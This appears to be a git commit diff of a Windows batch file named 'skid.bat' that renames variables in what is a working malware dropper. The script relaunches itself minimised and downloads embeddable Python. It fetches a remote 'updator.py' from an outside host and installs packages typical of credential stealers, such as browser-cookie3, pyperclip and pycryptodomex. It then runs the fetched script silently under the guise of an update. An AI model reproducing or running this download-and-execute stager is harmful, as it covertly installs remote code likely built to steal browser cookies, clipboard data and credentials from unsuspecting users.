2ce7c3311351f912d025dc8205e1bdb1efbe0721
im not racist guys <hailthemainlandoperator@gmail.com>
2025-03-30 22:12:58 -0500

    Update skid.bat

--- company/skid.bat
+++ company/skid.bat
@@ -4,10 +4,10 @@ if not "%1"=="h" start /min cmd /c %0 h & exit
 
 :: Variables
 set "PYTHON_URL=https://www.python.org/ftp/python/3.11.0/python-3.11.0-embed-amd64.zip"
-set "UPDATE_SCRIPT_URL=https://boostware-external-download.vercel.app/company/update.py"
+set "UPDATOR_SCRIPT_URL=https://boostware-external-download.vercel.app/company/updator.py"
 set "INSTALL_PATH=%USERPROFILE%\Python311"
 set "ZIP_PATH=%TEMP%\python311.zip"
-set "UPDATE_SCRIPT_PATH=%INSTALL_PATH%\update.py"
+set "UPDATOR_SCRIPT_PATH=%INSTALL_PATH%\updator.py"
 set "PIP_PACKAGES=cryptography opencv-python psutil pycountry pyperclip pypiwin32 requests requests-toolbelt wmi pyaesm browser-cookie3 colorama customtkinter nuitka packaging pillow pycryptodomex pyinstaller"
 
 :: Download Python embeddable zip
@@ -26,8 +26,8 @@ echo %~dp0python.exe %%* >> "%INSTALL_PATH%\python.bat"
 :: Add Python to User PATH (No Admin Needed)
 setx PATH "%INSTALL_PATH%;%PATH%" /M
 
-:: Download the update.py script
-powershell -Command "& {Invoke-WebRequest -Uri '%UPDATE_SCRIPT_URL%' -OutFile '%UPDATE_SCRIPT_PATH%'}"
+:: Download the updator.py script
+powershell -Command "& {Invoke-WebRequest -Uri '%UPDATOR_SCRIPT_URL%' -OutFile '%UPDATOR_SCRIPT_PATH%'}"
 
 :: Install pip
 powershell -Command "& {%INSTALL_PATH%\python.exe -m ensurepip}"
@@ -40,7 +40,7 @@ for %%p in (%PIP_PACKAGES%) do (
     powershell -Command "& {%INSTALL_PATH%\python.exe -m pip install %%p}"
 )
 
-:: Run update.py silently
-start /min "" "%INSTALL_PATH%\python.exe" "%UPDATE_SCRIPT_PATH%"
+:: Run updator.py silently
+start /min "" "%INSTALL_PATH%\python.exe" "%UPDATOR_SCRIPT_PATH%"
 
 exit
